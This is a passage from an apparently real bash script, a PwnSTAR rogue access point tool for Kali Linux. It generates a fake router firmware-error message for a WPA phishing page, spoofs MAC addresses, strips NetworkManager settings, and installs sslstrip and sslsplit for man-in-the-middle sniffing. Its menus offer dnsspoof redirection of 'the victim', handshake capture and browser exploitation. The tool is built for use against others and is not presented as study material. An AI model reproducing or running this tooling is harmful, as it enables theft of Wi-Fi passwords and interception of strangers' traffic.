RAND1=$(cat /dev/urandom | tr -dC '[:graph:] [:cntrl:] [:punct:]' | head -c 4)
RAND2=$(cat /dev/urandom | tr -dC '[:graph:] [:cntrl:] [:punct:]' | head -c 3)
RAND3=$(cat /dev/urandom | tr -dC '[:graph:] [:cntrl:] [:punct:]' | head -c 2)


echo -e "$info     If using WPA interactive phishing pages, the router"
echo -e "  model will be written into the phishing page.$txtrst" #(ROUTERTYPE)
echo ""
echo -e "$q  What is the target routers' $yel MAKE(i.e. D-Link, SpeedTouch etc.)$q? $txtrst"
read ROUTERTYPE

############## name of router ends
#-----------Write Router File For Phishing Page--------#
echo -e "$txtrst "

echo "$ROUTERTYPE WPA cache fault page code error 10200. WPA = ?..$RAND1 .$RAND3..$RAND2 .? is an unreadable WPA PMK protected object. Warning $ROUTERTYPE firmware failure. Reinitialize with product page 20223 via keyboard entry only." > /var/www/$wwwdir/routertype

echo -e "$info      A text file is being written to be used by the phishing page."
echo -e "$warn  If the warning message is longer then three lines enter $yel(n/N)$info and try again."
echo -e "      Warning file is seen below: $txtrst"
echo -e "$txtrst "
cat /var/www/$wwwdir/routertype

	while true
	do
	echo ""

echo -e "$inp  You entered $yel$ROUTERTYPE$inp type $yel(y/Y)$inp to confirm or $yel(n/N)$inp to try again.$txtrst"
read ROUTERTYPETEST

	case $ROUTERTYPETEST in
	y|Y|n|N) break ;;
	~|~~)
	echo Aborting -
	exit
	;;

	esac


	echo -e  "$warn  !!!Wrong input try again!!!$txtrst"

clear
	done

		done

chmod 775 /var/www/$wwwdir/routertype

fi

   if [[ $apusage == a ]];then

#Make random gibberish then insert in text

#RAND1=$(cat /dev/urandom -u -s -T | od -N4 -An -i)
#RAND3=$(cat /dev/urandom -u -s -T | od -N4 -An -i)

#RAND1=$(echo | head -c 4 /dev/random)
#RAND2=$(echo | head -c 5 /dev/random)

#Embeds nonsense characters into web page warning

RAND1=$(cat /dev/urandom | tr -dC '[:graph:] [:cntrl:] [:punct:]' | head -c 4)
RAND2=$(cat /dev/urandom | tr -dC '[:graph:] [:cntrl:] [:punct:]' | head -c 3)
RAND3=$(cat /dev/urandom | tr -dC '[:graph:] [:cntrl:] [:punct:]' | head -c 2)

#RAND1=$(cat /dev/urandom | tr -dC '[:graph:] [:cntrl:]' | head -c 2)
#RAND2=$(cat /dev/urandom | tr -dC '[:graph:] [:cntrl:]' | head -c 3)
#RAND3=$(cat /dev/urandom | tr -dC '[:graph:] [:cntrl:]' | head -c 4)


ROUTERTYPETEST=ZZZ

until [ $ROUTERTYPETEST == y ] || [ $ROUTERTYPETEST == Y ]; do
echo ""
echo -e "$info     If using WPA interactive phishing pages, the router"
echo -e "  model will be written into the phishing page.$txtrst" #(ROUTERTYPE)
echo ""
echo -e "$q  What is the target routers' $yel MAKE(i.e. D-Link, SpeedTouch etc.)$q? $txtrst"
read ROUTERTYPE

############## name of router ends
#-----------Write Router File For Phishing Page--------#
echo -e "$txtrst "

echo "$ROUTERTYPE WPA cache fault page code error 10200. WPA = ?..$RAND1 .$RAND3..$RAND2 .? is an unreadable WPA PMK protected object. Warning $ROUTERTYPE firmware failure. Reinitialize with product page 20223 via keyboard entry only." > /var/www/$wwwdir/routertype


#echo "$ROUTERTYPE WPA cache fault page code error 10200. WPA = ?.. $RAND1 $RAND2 ...? is an unreadable WPA PMK protected object. Warning $ROUTERTYPE firmware failure. Reinitialize with product page 20223 via keyboard entry only." > /var/www/$wwwdir/routertype

echo -e "$info  A text file is being written to be used by the phishing page."

echo -e "      Warning file is seen below: $txtrst"
echo -e "$txtrst "

cat /var/www/$wwwdir/routertype

	while true
	do
	echo ""

echo -e "$inp  You entered $yel$ROUTERTYPE$inp type $yel(y/Y)$inp to confirm or $yel(n/N)$inp to try again.$txtrst"
read ROUTERTYPETEST

	case $ROUTERTYPETEST in
	y|Y|n|N) break ;;
	~|~~)
	echo Aborting -
	exit
	;;

	esac


	echo -e  "$warn  !!!Wrong input try again!!!$txtrst"

clear
	done

		done

chmod 775 /var/www/$wwwdir/routertype

fi

}

#~~~~~~~~~~~~~~~End WPA Interactive Phishings Page End~~~~~~~~~~~~~~~#

# echo -e "\e[0;40m"      # background black
clear

# ~~~~~~~~~~ Intro ~~~~~~~~~~ #

banner_fn()
{
	echo -e "\e[1;37m 
        ~~~~~~~~~~~~~~~~~~~~~~~VulpiArgenti~~~~~~~~~~~~~~~~~~~~~                                                                 
           _____                   _____ _______       _____  
          |  __ \                 / ____|__   __|/\   |  __ \ 
          | |__) |__      ___ __ | (___    | |  /  \  | |__) |
          |  ___/ \ \ /\ / / '_ \ \___ \   | | / /\ \ |  _  / 
          | |      \ V  V /| | | |____) |  | |/ ____ \| | \ \ 
          |_|       \_/\_/ |_| |_|_____/   |_/_/    \_\_|  \_\        
         
        ~~~~~~~~~~~~~~~~~~~~Pwn_SofT_Ap_scRipt~~~~~~~~~~~~~~~~~~

                                     :
                                     N 
                                 < W 0 E >                                
                                     S
                                     :

"
sleep 2
}

first_fn()
{	







if [ ! -d "/var/www/html" ]; then

    mkdir -p -m 755 /var/www/html;

	fi

if [ ! -d "/root/HANDSHAKEHOLD" ]; then

    mkdir -p -m 755 /root/HANDSHAKEHOLD;

	fi

	# Trap Ctrl-C
	trap exit_fn INT 
	# Clear iptables
	iptables --flush    # delete all rules in default (filter) table
    iptables -t nat --flush
	iptables -t mangle --flush
    iptables -X         # delete user-defined chains
    iptables -t nat -X
	iptables -t mangle -X
	
	if [[ ! -x /usr/sbin/dhcpd ]];then
		echo -e "$warn\n    Need to install isc-dhcp-server."
        sleep 1
        echo -e "$q\n     Do you want to do it now?$yel (y/n)$txtrst"
	echo -e "$info  If you wish to install obtain an internet connection"
	echo -e "$info  then enter $yel(y)$info.$txtrst"   
        read var
        if [[ $var == y ]];then
            apt-get install isc-dhcp-server
        else
            exit_fn
        fi
	fi


sslinstall_fn()
{
	if [[ ! -x /etc/mitmf ]];then
		echo -e "$warn\n     Need to install mitmf to run sslstrip+."
		echo -e "$info If mitmf not installed then sslstrip+ cannot be run"
		echo -e "$info If you are using a persistent usb install of kali-linux"
		echo -e "$info mitmf may not function due to problems with Twisted see"
		echo -e "$info help files for further." 

        sleep 1
        echo -e "$q\n    Do you want to do it now?$yel (y/n)$txtrst"
	echo -e "$info  If you wish to install obtain an internet connection"
	echo -e "$info  then enter $yel(y)$info.$txtrst"

        read var
        if [[ $var == y ]];then
            apt-get install mitmf
            
        fi
	fi

}

sslinstall_fn

splitinstall_fn()
{
	if [[ ! -x /usr/bin/sslsplit ]];then
		echo -e "$warn\n     Need to install sslsplit?"
		echo -e ""

        sleep 1
        echo -e "$q\n     Do you want to do it now?$yel (y/n)$txtrst"
	echo -e "$info  If sslsplit is not installed Pwnstar9 can still be run"
	echo -e "$info  however the sslsplit module will not function."
	echo ""  
	echo -e "$info  If you wish to install obtain an internet connection"
	echo -e "$info  then enter $yel(y)$info.$txtrst"

        read var
        if [[ $var == y ]];then

            apt-get install sslsplit
            
		        fi


	fi

}

splitinstall_fn

keycrt_fn()

{

if [[  ! -f  /root/ca.key  ]] || [[  ! -f  /root/ca.crt  ]]; then

	echo -e "$warn     Credentials files for use by sslsplit are missing."
	echo ""
	echo -e "$info  Sslsplit requires a ca.key and ca.crt file placed in root/"
	echo -e "$info  Pwnstar9 can be run but sslsplit will not function."
	echo -e "$info  The files can be made using openssl. See Pwnstar help files"
	echo -e "$info  for further info."
	echo ""
	echo -e "$inp    Enter any key to continue....."
	read contx

	fi
}

keycrt_fn
	
    apusage= # set to null
clear
	echo ""
	echo ""
 	echo ""
	echo ""
	echo ""
	echo -e "$bold$info  Press$yel ctrl-C$info at any time to exit neatly\n"
	echo -e "$warn  _______________________________________"
    sleep 3
clear
	echo ""
	echo ""
 	echo ""
	echo ""
	echo ""
	echo -e "$q     How do you want to use the AP?"
	echo ""
	echo -e "$inp     Enter the line number in the Basic Menu below:"
	echo -e "$warn     ______________________________________________ $norm"
	sleep 5

clear


until [[ $apusage == 3 ]] || [[ $apusage == 4 ]] || [[ $apusage == 9 ]]; do


    echo -e "$bold$def
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
                                   Basic Menu
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~$norm
	
   $dim$inp 1$yel)$dgrey Not Supported - Honeypot: get the victim onto your AP, then use nmap,
                       metasploit etc no internet access given
	
   $dim$inp 2$yel)$dgrey Not Supported - Grab WPA handshake$norm
	
   $bold$inp 3$yel)$info Sniffing: provide internet access, then use ferret, mitmf-sslstrip+ or
       sslstrip(old) and sslsplit
	
   $inp 4$yel)$info Simple web server with dnsspoof: redirect the victim to your webpage
       (WPA Phishing,no internet access required,HTTPS requests not supported)
       Internet Access Poor - HTTPS-HTTP Trap Pass-thru will not function$norm
	
   $dim$inp 5$yel)$dgrey Not Supported - Karmetasploit
    
   $dim$inp 6$yel)$dgrey Not Supported - Browser_autopwn$norm
	 
   $bold$inp 9$yel)$info ADVANCED menu (equipment intensive)
       Internet Access Good, HTTPS-HTTP Trap Passthru functions
       Sniffing with ferret and sslstrip available
    
   $inp q$yel)$info Exit from the script$norm"
    
	read apusage
	if [[ $apusage = q ]];then
		exit_fn
    elif [[ $apusage != [1-6] && $apusage != 9 ]];then
        first_fn
    elif [[ $apusage = 9 ]];then
        adv_usage_fn
	fi


    	if [[ $apusage != 3 ]] && [[ $apusage != 4 ]] && [[ $apusage != 9 ]]; then


	echo -e "$info      Choice incorrect or Not Supported in this Version"
		sleep 3
	 
		fi
			done

    setup_fn
}

setup_fn()
{
    clear
    echo "1" > /proc/sys/net/ipv4/ip_forward # enable kernel forwarding
	interface_fn
	initial_scan_fn
	ap_presets_fn
    if [[ $apusage = 2 ]];then
		echo -e  "$warn\n  Remember to start the AP with WPA/WPA2 encryption"
		sleep 2
	fi
    ap_setup_fn
    ap_type_fn
    ap_start_fn
#   rogue_assoc_fn
    dhcp_presets_fn
	dhcp_setup_fn
	dhcp_start_fn

	case $apusage in 
	
	1) 	clear
		echo -e "$info\n   Watch the DHCP tail for visitors, and then play with them!!";;
        
        2)  clear
            echo -e "$info\n    Monitor airbase for client associations"
            sleep 2
            echo -e "$info\n  Handshakes will be saved in /root/PwnSTAR-n.cap"
            sleep 2
            echo -e "$info\n  Consider de-authing clients";;
			
	3)	sniff_fn;;
			
	4) 	directory_select_fn
			apache_fn
			dns_fn
			tail_txtfile_fn;;
            
        5)  karmalaunch_fn;;
        
        6)  browser_autopwn_fn;;
        
        a)  portals_fn;;
        
        b)  pdf_fn;;
        
        c)  zday_fn;;
        
        d)  java_jre17_jmxbean_fn;;
        
        e)  browser_exploit_fn
        
	esac
    
    
    sleep 8
    echo
    final_fn
}

# ~~~~~~~~~~ Interface Functions ~~~~~~~~~~ #

dev_check_fn() # from "quickset" - checks device exists
{
ifconfig $dev_check_var &> /dev/null  # &> redirects stdout and stderr; prevents screen clutter
if [ $? -ne 0 ] || [ $dev_check_var == wlan ] || [ $dev_check_var == eth ] || [ $dev_check_var == ath ] || [ $dev_check_var == mon ]  ; then  # corrects ifconfig bug if wlan/eth/ath/mon entered
	echo -e "$warn\n  Device does NOT exist."
	sleep 1
	dev_check="fail"
	interface_fn
else
	dev_check= # nulled
fi

}	

interface_fn()
{
    API= # AP interface
    ICI= # Internet-connected interface
    internet=
    if [[ $apusage != [1-2] ]];then

	echo ""
	echo ""
	echo -e "      $yel!!!$undr$inp You Must Complete the Following Before Proceeding $norm$yel!!!"
	echo -e ""
	echo -e "$info    Because of Network-manager/airmon-ng conflicts, it is best to"
	echo -e "  run Pwnstar9.0 directly after start. If you have run the command"
	echo -e "  airmon-ng check kill, your Network-Manager may not be completely re-"
	echo -e "  stored so reboot the computer. If Pwnstar9.0 has just shutdown,"
	echo -e "  some routines use airmon-ng check kill, so you may also have to"
	echo -e "  reboot the computer."

	echo -e "     If wifi device monitors like wlan0mon have been made to scan for"
	echo -e "  targets, remove these device monitors manually using airmon-ng in a"
	echo -e "  terminal window. If these devices cannot be removed reboot the computer."
	echo -e ""
	echo -e "$inp    When ready select any key to continue.....$txtrst"
	read var

	echo -e "$info     If internet access will be provided, an internet connection must"
        echo -e "  be establish and the mac address spoofed thru Network-Manager"


#dead dna = AUTOCON_fn
#	if [[ $KALI_TYPE -eq 2 || KALI_TYPE -eq 3 ]]; then

#				AUTOCON_fn

#				fi


##############################
ENTCODETEST=ZZZ

until [[ $ENTCODETEST == y ]] || [[ $ENTCODETEST == Y ]]; do

clear
echo ""
echo -e "$bold$info  Mac Spoofing the Device Connected to the Internet"
echo -e "$warn  _________________________________________________$norm"
echo  ""
echo -e "$info     If internet access will be provided, any spoofed mac address MUST be"
echo -e "$info  established by Network Manager ONLY. Network Manager overrides any"
echo -e "$info  previously spoofed mac address setup thru the terminal window."
echo ""
echo -e "$q     Do you wish to enter a cloned mac address into ALL Wireless Network"
echo -e "$q  files found in the etc/NetworkManager/system-connections folder? These"
echo -e "$q  are the same wireless networks listed in Network Manager menus."
echo ""
echo -e "$inp     Type$yel (y/Y)$inp to enter a cloned mac address in all connections."
echo ""
echo -e "$inp     Select$yel (n/N)$inp to skip this feature if internet access will not be"
echo -e "$inp  provided or if you do not wish to globbally enter a mac address in all con-"
echo -e "$inp  nections. You can enter a cloned mac address manually thru Network Manager"
echo -e "$inp  menus for the specific network providing access before proceeding.$txtrst"

read ENTCODE

	while true
	do
	echo ""

echo -e "$inp  You entered $yel$ENTCODE$inp type $yel(y/Y)$inp to confirm or $yel(n/N)$inp to try again.$txtrst"
read ENTCODETEST

	case $ENTCODETEST in
	y|Y|n|N) break ;;
	~|~~)
	echo Aborting -
	exit
	;;

	esac
	echo -e  "$warn  !!!Wrong input try again!!!$txtrst"

	done

if [[ $ENTCODE != y ]] && [[ $ENTCODE != Y ]] && [[ $ENTCODE != n ]] && [[ $ENTCODE != N ]]; then


	echo -e  "$warn  Wrong input enter $yel(y/Y/n/N)$warn ONLY - try again!!!"
	sleep 3
	ENTCODETEST=ZZZ

		fi

		done


if [[ $ENTCODE  == y ]] || [[ $ENTCODE  == Y ]]; then

until [[ $MACMANTEST == y ]] || [[ $MACMANTEST == Y ]]; do

clear

	mac_list=$(cat /root/mac_history.txt)

	echo "$mac_list" | sed 's/^/       /'

echo " "
echo -e "$info Mac addresses previously entered along with comments are seen above.$txtrst"
	echo -e "$txtrst"
	echo -e "$q\n     What mac address do you wish to enter(i.e. 00:11:22:AA:BB:CC)"
	echo -e "$q\n  into ALL Wifi connection files for Network Manager?"
	echo -e ""  
	echo -e "$info     Any Mac addresses entered manually are stored as text in a"
	echo -e "$info  /root/mac_history file seen above along with any comments."
	echo -e "$info  You can use the keyboard and/or mouse to insert the required"
	echo -e "$info  mac address below."
	echo ""
	echo -e "$inp  Enter in this format ONLY (i.e.$yel 55:44:33:CC:AA:BB$inp).$txtrst"
	read MACCODE

	while true
	do
	echo ""

echo -e "$inp  You entered $yel$MACCODE$inp type $yel(y/Y)$inp to confirm or $yel(n/N)$inp to try again.$txtrst"
read MACMANTEST

	case $MACMANTEST in
	y|Y|n|N) break ;;
	~|~~)
	echo Aborting -
	exit
	;;

	esac
	echo -e  "$warn  !!!Wrong input try again!!!$txtrst"

	done

#####mac error test start
# Insure upper case to avoid problems w/ other programs

MACCODE=$(echo $MACCODE | awk '{print toupper($0)}')

MACPUNCT=":::::"
PUNCTEST=`echo "$MACCODE" | tr -d -c ".[:punct:]"`
MACALNUM=`echo "$MACCODE" | tr -d -c ".[:alnum:]"`

if [[ $MACALNUM =~ [0-9A-Fa-f]{12} ]]; then

	testhex=0

	else

	testhex=1

	fi

if [[ "$PUNCTEST" != "$MACPUNCT" ]] || [[ ${#MACCODE} != 17 ]] || [[ $testhex == 1 ]]; then

     echo -e "$warn  Mac Address FORMAT incorrect check length, symbol= : use hex character ONLY$txtrst"
	sleep 3

	MACMANTEST=ZZZ

	else

	echo -e "$info  Correct mac address format continuing...."
	sleep 3

		fi

#####mac error test end

		done

echo -e "$info     Entering$yel  $MACCODE$info into ALL wifi Devices listed"


#kali 1 and 2

	if [[ $KALI_TYPE -eq 1 ]] || [[ $KALI_TYPE -eq  2 ]]; then

find /etc/NetworkManager/system-connections -type f -exec sh -c "sed -i \"/^cloned-mac-address.*/d;/^\[802-11-wireless\]/a\cloned-mac-address=$MACCODE\" \"{}\"" \;
sleep 3


			fi

	if [[ $KALI_TYPE -eq 3 ]]; then

#kali 3

find /etc/NetworkManager/system-connections -type f -exec sh -c "sed -i \"/^cloned-mac-address.*/d;/^\[wifi\]/a\cloned-mac-address=$MACCODE\" \"{}\"" \;
sleep 3

			fi



echo "$MACCODE $MACCOM" >> /root/mac_history.txt
cat < /root/mac_history.txt | sort -u -o /root/mac_history.txt


		fi

AUTOCONTEST=ZZZ

until [[ $AUTOCONTEST == y ]] || [[ $AUTOCONTEST == Y ]]; do

clear
echo ""
echo -e "$bold$info  Autoconnect Settings in Network Manager"
echo -e "$warn  _______________________________________$norm"
echo  ""

echo ""
echo -e "$q     Do you wish to remove all autoconnect settings for Networks found"
echo -e "$q  in the /etc/NetworkManager/system-connections folder."
echo ""
echo -e "$info                           $undr Considerations $norm"
echo ""
echo -e "$info     Removing the auto connect setting will prevent Network-Manager"
echo -e "$info  from jumping from one Network to another if internet connection is"
echo -e "$info  lost. It will prevent Network Manager from attempting to use a device"
echo -e "$info  unless specifically commanded to do so by the user."
echo -e "$warn     You must enter the autoconnect selection thru the NetworkManager menus for" 
echo -e "$warn  the Network providing internet access to allow reassociation if connection"
echo -e "$warn  lost. All other auto-connect settings for other Networks must be turned off,"
echo -e "$warn  otherwise if connection lost device may jump to a different DNS and program"
echo -e "$warn  settings in Pwnstar will be corrupted."
echo ""
echo -e "$inp     Enter$yel (y/Y)$inp to remove ALL auto-connect settings for Network Manager."
echo ""          
echo -e "$inp   Select$yel (n/N)$inp to skip this feature.$txtrst"
read AUTOCON

	while true
	do

	echo ""
echo -e "$inp  You entered $yel$AUTOCON$inp type $yel(y/Y)$inp to confirm or $yel(n/N)$inp to try again.$txtrst"
read AUTOCONTEST

	case $AUTOCONTEST in
	y|Y|n|N) break ;;
	~|~~)
	echo Aborting -
	exit
	;;

	esac
	echo -e  "$warn  !!!Wrong input try again!!!$txtrst"

	done

if [[ $AUTOCON != y ]] && [[ $AUTOCON != Y ]] && [[ $AUTOCON != n ]] && [[ $AUTOCON != N ]]; then


	echo -e  "$warn  Wrong input enter $yel(y/Y/n/N)$warn ONLY - try again!!!"
	sleep 3
	AUTOCONTEST=ZZZ

		fi

		done


		if [[ $AUTOCON == y ]] || [[ $AUTOCON == Y ]]; then

find /etc/NetworkManager/system-connections -type f -exec sh -c "sed -i \"/^autoconnect=*/d;/^\[connection\]/a\autoconnect=false\" \"{}\"" \;

				fi

###################startRandom mac off############################
RANCONTEST=ZZZ

until [[ $RANCONTEST == y ]] || [[ $RANCONTEST == Y ]]; do

clear
echo ""
echo -e "$bold$info  Mac Address Randomization in Network Manager"
echo -e "$warn  ____________________________________________$norm"
echo  ""

echo ""
echo -e "$q     Do you wish to remove all Mac Address Radomization setting for Networks found"
echo -e "$q  in the /etc/NetworkManager/system-connections folder."
echo ""
echo -e "$info                           $undr Considerations $norm"
echo ""
echo -e "$info     Removing the Mac Address Radomization settings in Network-Manager"
echo -e "$info  will prevent Network Manager from changing any mac addess settings"
echo -e "$info  established thru Network Manager menus unless specifically "
echo -e "$info  commanded to do so by the user."
echo ""
echo -e "$inp     Enter$yel (y/Y)$inp to remove ALL Mac Address Radomization settings for Network Manager."
echo ""          
echo -e "$inp   Select$yel (n/N)$inp to skip this feature.$txtrst"
read RANCON

	while true
	do

	echo ""
echo -e "$inp  You entered $yel$RANCON$inp type $yel(y/Y)$inp to confirm or $yel(n/N)$inp to try again.$txtrst"
read RANCONTEST

	case $RANCONTEST in
	y|Y|n|N) break ;;
	~|~~)
	echo Aborting -
	exit
	;;

	esac
	echo -e  "$warn  !!!Wrong input try again!!!$txtrst"

	done

if [[ $RANCON != y ]] && [[ $RANCON != Y ]] && [[ $RANCON != n ]] && [[ $RANCON != N ]]; then


	echo -e  "$warn  Wrong input enter $yel(y/Y/n/N)$warn ONLY - try again!!!"
	sleep 3
	RANCONTEST=ZZZ

		fi

		done


		if [[ $RANCON == y ]] || [[ $RANCON == Y ]]; then

find /etc/NetworkManager/system-connections -type f -exec sh -c "sed -i \"/^mac-address-randomization=*/d;/^\[wifi\]/a\mac-address-randomization=0\" \"{}\"" \;

				fi

#################end random mac#############################


  if [[ $ENTCODE == y  ]] || [[ $ENTCODE  == Y ]] || [[ $AUTOCON == y ]] || [[ $AUTOCON == Y ]]; then


clear
echo ""
echo -e "$bold$info  Reinitialize Settings in Network Manager"
echo -e "$warn  _____________________________________________$norm"
echo  ""

echo -e "$info     To initialize these new settings, Network Manager(NM) must be restarted." 
echo -e "$info  Kali linux 2016R doesnot respond well to a restart of NM therefore"
echo -e "$info  it is best to reboot the computer."
echo ""
echo -e "$inp     If you wish to reboot the computer, type Ctrl-c to end the program then type"
echo -e "$inp  reboot in the terminal window(recommended)."
echo ""
echo -e "$inp     If you wish to only restart Network-manager(not recommended)"
echo -e "$inp  enter $yel(r/R)$inp ."
echo ""
echo -e "$inp     If you wish to continue without resetting Network-manager enter $yel(c/C)$inp ."

	read  resetnm

      if [[ $resetnm == r ]]  || [[ $resetnm == R ]]; then
                 
	service network-manager restart 2> /dev/null > /dev/null
	service NetworkManager restart 2> /dev/null > /dev/null
	service avahi-daemon restart 2> /dev/null > /dev/null

	echo -e "$txtrst"
	echo -e "$bold  Restarting Network Manager to initialize new settings"
	echo -e "$bold  _____________________________________________________$norm"
	echo ""
	sleep 3

		fi

		fi

	clear
	ping1=1 #Set DNSRESPOND_fn xterm window to upper lefthand corner of screen
	echo ""
	echo -e "$bold$info  Internet Access"
	echo -e "$bold$warn  _______________$norm"
	echo ""
	echo -e "$info     If internet access will be provided establish an internet"
	echo -e "  connection at this time. When a internet connection has been made or"
	echo -e "  if no internet access will be provided then..."
	echo -e ""
	echo -e "$inp    Select any key to continue.....$txtrst"
	read var

clear
	echo ""
	echo -e "$bold$info  Status of Internet Connection"
	echo -e "$bold$warn  _____________________________$norm"
	echo "" 

	echo -e "$info     If NO internet access will be provided type$yel (c/C)$info to skip this page."
	echo ""
	echo -e "$info     Connection information from NetworkManager drop-down menus"
	echo -e "$info  cannot be trusted!!! Wifi status from iwconfig, /etc/resolv.conf"
	echo -e "$info  are seen below. This checks connection to DNS. A ping window"
	echo -e "$info  in upper right-hand corner of screen shows ability of DNS server"
	echo -e "$info  to obtain data from the internet. A captive portal requires both a"
	echo -e "$info  connection to DNS and a working internet connection. $txtrst"

holdout1_fn()
{
		if [[ $ifselect == old ]]; then

		ifconfig -a | grep -e wlan -e eth -e ath | awk '{ print $1"   "$5 }' # displays available interfaces

				fi

			if [[ $ifselect == new ]]; then

		ifconfig -a | grep -e wlan -e eth -e ath | awk '{if (($1 != "ether") || (substr($1,length($1),1) == ":")) {print $1}; if (($1 == "ether") || ($1 == "unspec")) {print $2}}'

				fi

}

#	ifconfig -a | grep -e eth -e ath -e wlan | awk '{ print $1"   "$5 }' 2>/dev/null	
	echo "" 

	iwconfig | awk -F' ' '{ if( $2 == "IEEE" ) { print $0 }}'

	if [[ -f /etc/resolv.conf ]]; then

	DNS=$(cat </etc/resolv.conf |  awk -F' ' '{ if( $1 != "#") { print $0 }}')

		fi

		if  [ -z  "$DNS" ]; then  # check availability of DNS connection

			echo "No DNS nameserver available - check internet connection!!"

		else

			echo "$DNS internet connection available."

		fi
	
DNSRESPOND_fn

#responsepid=$!

	echo -e ""
	echo -e "$info     If Internet Access Will Be Provided \e[4mCONFIRM INTERNET CONNECTION EXITS?$norm"
	echo -e "$info  If no internet connection seen - reestablish thru Network-Manager."
	echo -e "$info  If mac address incorrect - set thru Network Manager ONLY!"
	echo -e "$warn   !!!Do not use macchanger to set mac address for this device!!!" 
	echo -e "$inp     To recheck connection status enter$yel (y/Y)$inp."
	echo -e "$inp   When internet access exists type$yel (c/C)$inp to continue...$txtrst"
	read  recheckint

		if [[ $recheckint == y  ||  $recheckint == Y ]]; then

				interface_fn

					fi

#        echo ""
#	echo -e "$inp  Type$yel [Enter]$inp when you are ready to continue....$txtrst"
#read var
clear
kill $responsepid 2> /dev\null
#killall -q xterm  2> /dev\null
clear
ping1=0   #Set DNSRESPOND_fn xterm window to lower lefthand corner of screen 
internet=ZZZ

until [ $internet == y ] || [ $internet == n ]; do

	echo ""
	echo ""
	echo -e "$bold$info  Current Network Manager Connection Status"
	echo -e "$warn  _________________________________________$norm"
	echo -e "$txtrst"
	nmcli d


	echo ""
	echo ""
        echo -e "$q\n    Will internet access be provided$yel (y/n)$q?$txtrst"
	read internet


	if [[ $internet != y ]] && [[ $internet != n ]]; then

	clear
	echo ""
	echo -e  "$warn  Wrong input enter $yel(y/n)$warn ONLY - try again!!!"
	sleep 3

		fi


			done

        if [[ $internet == "y" ]]; then


		if [[ $apusage == 4 ]]; then
	echo ""
	echo -e "$info     Item 4 Simple web server with dnsspoof provides poor"
	echo -e "  Internet Access and the HTTPS-HTTP Pass-thru Trap will not"
	echo -e "  function. If you wish to provide internet access use item"
	echo -e "  $yel 9$info ADVANCED, menu$yel a)$info Captive portals instead. "
	echo -e ""
	echo -e "$inp  Enter$yel (y/Y)$inp to return to Basic Menu,"
	echo -e "  Enter$yel (c/C) to continue.....$txtrst"
	read contin

		if [[ $contin == y || $contin == Y  ]]; then

			first_fn		

				fi
					fi

clear

       if [[ $internet = "y" ]] && [[ $apusage = 3  || $apusage = a || $apusage = b || $apusage = c ]]; then


HTTPS_PASSTEST=ZZZ

until [ $HTTPS_PASSTEST == y ] || [ $HTTPS_PASSTEST == Y ]; do     

	clear
	echo ""
	echo -e "$bold$info  HTTP/HTTPS Requests"
	echo -e "$bold$warn  ___________________$norm"
	echo ""
	echo ""
	echo -e "$info     When providing internet access two(2) types of internet"
	echo -e "  connection pass-thru are available."
	echo -e "$yel  Method 1$info"
	echo -e "     If the client makes an HTTPS  request,  you can allow a  client to"
        echo -e "  access the internet bypassing the phishing page.  If the client makes"
	echo -e "  any HTTP request however, the client is directed to the phishing page."
	echo -e "  This selection works well with WPA Phishing. It also pulls in clients"
	echo -e "  using android phones onto the system and then sends them later to the"
	echo -e "  phishing page. Only functions with 9 ADVANCED menu a) Captive portals"
	echo -e "  and 3 Sniffing. No invalid ssl certificate warning will be seen when"
	echo -e "  HTTPS requests are made."
	echo -e "$yel  Method 2$info"
	echo -e "       This type of connection doesnot respond to any HTTPS request,"
        echo -e "  and only sends the client to the phishing page if a HTTP request is"
	echo -e "  made. However a client who cannot get internet access may quickly leave."
	echo -e "       In either case if Apache 2 is setup to use a self-signed certificate"
        echo -e "  remove these self-signed certificates so the feature will not function."
	echo ""
	echo -e "$inp  To allow$yel(Method 1)$inp HTTPS requests to bypass the phishing page select$yel (y/Y)$inp."	
	echo -e "$inp  To not respond$yel(Method 2)$inp to HTTPS requests enter$yel (n/N)$inp.$txtrst"

	read HTTPS_PASS

	while true
	do

	echo ""
	echo -e "$inp     You have entered$yel $HTTPS_PASS$inp  Select$yel (y/Y)$inp to confirm"
        echo -e "  or$yel (n/N)$inp to try again.$txtrst"

	read HTTPS_PASSTEST

	case $HTTPS_PASSTEST in
	y|Y|n|N) break ;;
	~|~~)
	echo Aborting -
	exit
	;;

	esac
	echo -e  "$warn  !!!Wrong input try again!!!$txtrst"

	done

if [[ $HTTPS_PASS != y ]] && [[ $HTTPS_PASS != Y ]] && [[ $HTTPS_PASS != n ]] && [[ $HTTPS_PASS != N ]]; then

	clear
	echo ""
	echo -e  "$warn  Wrong input enter $yel(y/Y/n/N)$warn ONLY - try again!!!"
	sleep 3
	HTTPS_PASSTEST=ZZZ

		fi

		done

			fi

				fi



        if [[ $internet = "y" ]]; then

	clear
	echo ""
	echo -e "$bold$info  Internet Connected Interface"
	echo -e "$bold$warn  ____________________________$norm"

            while [ -z $ICI ];do
                echo -e "$def\n    Available interfaces:$txtrst"
		echo ""

		if [[ $ifselect == old ]]; then

		iwconfig

#		ifconfig -a | grep -e wlan -e eth -e ath | awk '{ print $1"   "$5 }' 2>/dev/null # displays available interfaces

				fi

			if [[ $ifselect == new ]]; then

		iwconfig

#		ifconfig -a | grep -e wlan -e eth -e ath | awk '{if (($1 != "ether") || (substr($1,length($1),1) == ":")) {print $1}; if (($1 == "ether") || ($1 == "unspec")) {print $2}}'

				fi

#                ifconfig -a | grep -e eth -e ath -e wlan | awk '{ print $1"   "$5 }' 2>/dev/null                
#               ifconfig -a | grep wlan | awk '{ print $1"   "$5 }'

                echo -e "$q\n    What wired or wireless device$yel(i.e. eth0,wlan1 etc.)"
                echo -e "$q  will provide the internet connected interface?$txtrst"
                read ICI

                dev_check_var=$ICI
                dev_check_fn
                    if [[ $dev_check == "fail" ]]; then
                        ICI= # Nulled
                        internet=
			constat=
                        interface_fn

                    fi


DNSCONL_fn()

{

	constat=$(iwconfig $ICI | grep $ICI | awk '{ print $4 }')

	if [[ $constat == ESSID:off/any ]] && [[ $internet == "y" ]]; then	

	echo ""
	echo -e "$yel                           !!!!!$warn WARNING$yel!!!!!"
	echo -e "$info     Interface$yel $ICI$info may not be associated to a network"
	echo -e "$info  Insure interface$yel $ICI$info has an internet connection thru"
	echo -e "$info  Network Manager. If no association the rogueAP will not function."
	echo -e "$inp     When ready type any key to continue....$txtrst"
	read continue
	constat=

			fi

	DNSONLINE=$(cat /sys/class/net/$ICI/carrier)

